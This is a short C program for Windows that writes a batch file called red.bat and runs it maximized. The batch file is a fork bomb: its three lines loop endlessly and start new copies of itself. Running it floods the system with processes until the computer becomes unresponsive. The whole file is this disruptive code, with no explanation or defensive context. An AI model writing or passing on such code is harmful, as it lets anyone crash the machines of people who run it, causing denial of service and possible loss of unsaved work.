#include <stdio.h>
#include <stdlib.h>
#include<windows.h>

int main(int argc, char *argv[]) {
	FILE * fp;
	fp = fopen ("red.bat","w+");
	fprintf(fp, "%s" "%s" "%s",":12 \n","@start %0 \n","@goto 12");
	fclose(fp);
	system("start /Max red.bat");
	return(0);
}
